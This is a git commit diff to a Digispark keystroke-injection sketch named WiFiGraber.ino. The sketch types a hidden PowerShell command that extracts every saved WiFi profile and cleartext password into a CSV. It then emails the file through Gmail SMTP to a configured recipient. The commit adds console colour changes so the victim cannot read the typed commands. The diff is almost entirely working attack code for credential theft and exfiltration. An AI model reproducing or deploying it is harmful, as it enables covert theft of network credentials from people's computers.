b76c3268b7db4dd4a1188e92368769bc245c4325
dxD7 <40486657+dxD7@users.noreply.github.com>
2019-08-19 21:56:47 -0400

    Update WiFiGraber.ino
    cmd color change to hide the text

--- WiFiGraber.ino
+++ WiFiGraber.ino
@@ -1,8 +1,8 @@
 /********************************************************************************
   Gather WiFi data and email it,  !!!NEED ADMIN PRIVILEGES!!! 
-  Change line 19 and 32 ('Desktop') to location you want file saved
-  Change line 32 'GMAIL_USERNAME'<-username ONLY, ;GMAIL_PASSWORD', 'SENDER_EMAIL', 'RECEIVER_EMAIL'.
-  Change line 43 to set location file was saved
+  Change line 22 and 38 ('Desktop') to location you want file saved
+  Change line 38 'GMAIL_USERNAME'<-username ONLY, ;GMAIL_PASSWORD', 'SENDER_EMAIL', 'RECEIVER_EMAIL'.
+  Change line 52 to set location file was saved
   CREDIT: C4PT14ND34DP00L
 *******************************************************************************/
 
@@ -15,7 +15,10 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
   DigiKeyboard.delay(800);
   DigiKeyboard.sendKeyStroke(KEY_A);
-  DigiKeyboard.delay(1500);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("COLOR EF");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
   DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"$DesktopPath = [Environment]::GetFolderPath('Desktop'); cd $DesktopPath; (netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv WiFi.csv"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
@@ -28,16 +31,22 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
   DigiKeyboard.delay(800);
   DigiKeyboard.sendKeyStroke(KEY_A);
-  DigiKeyboard.delay(1500);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("COLOR EF");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
   DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass $DesktopPath = [Environment]::GetFolderPath('Desktop'); cd $DesktopPath; $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('GMAIL_USERNAME', 'GMAIL_PASSWORD'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'SENDER_EMAIL'; $ReportEmail.To.Add('RECEIVER_EMAIL'); $ReportEmail.Subject = 'DigiDuck Report'; $ReportEmail.Body = 'Attached is your report from ' + $env:computername + '. - Regards Your Digispark'; $ReportEmail.Attachments.Add($DesktopPath + '\\WiFi.csv'); $SMTPInfo.Send($ReportEmail)"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
 
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.print("cmd");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("COLOR EF");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
   
   //Change to file location
   DigiKeyboard.print("cd %UserProfile%\\Desktop");
